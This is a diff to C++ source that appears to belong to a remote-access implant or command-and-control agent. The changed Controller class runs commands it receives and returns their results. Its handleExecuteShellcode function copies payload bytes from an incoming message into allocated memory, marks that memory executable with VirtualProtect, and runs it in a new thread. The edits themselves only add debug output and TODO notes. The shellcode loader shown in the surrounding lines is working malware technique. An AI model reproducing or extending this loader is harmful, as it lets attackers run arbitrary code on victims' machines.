@@ -63,13 +63,14 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 
 	MessageHeader header;
 	header.messageType_ = MessageType::COMMAND_RESULT;
-	header.messageId_ = 105; // TODO: 
+	header.messageId_ = 105; // TODO: use input messageId?
 	header.dataSize_ = outMsg.data_.size();
 	outMsg.header_ = header;
 
 	messageHandler_->sendMessage(outMsg);
 }
 
+// TODO: figure out why this crashes the program
 void Controller::handleExecuteShellcode(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
@@ -77,6 +78,7 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
+		std::cout << "VirtualAlloc failedn" << std::endl;
 		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
 	}
 
@@ -92,6 +94,7 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	// NOTE: virtualProtect is also being called somewhere in the windows api
 	if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
 	{
+		std::cout << "VirtualProtect failed" << std::endl;
 		// Fail silently if we cannot make the memory executable.
 	}
 
@@ -102,12 +105,12 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
 	if (!thread)
 	{
+		std::cout << "CreateThread failed" << std::endl;
 		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
 	}
 
 	// DEBUG_PRINT("7 - Thread created, waiting..."); 
 	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
-
 }
 
 /* NOTE: creating seperate process entirely
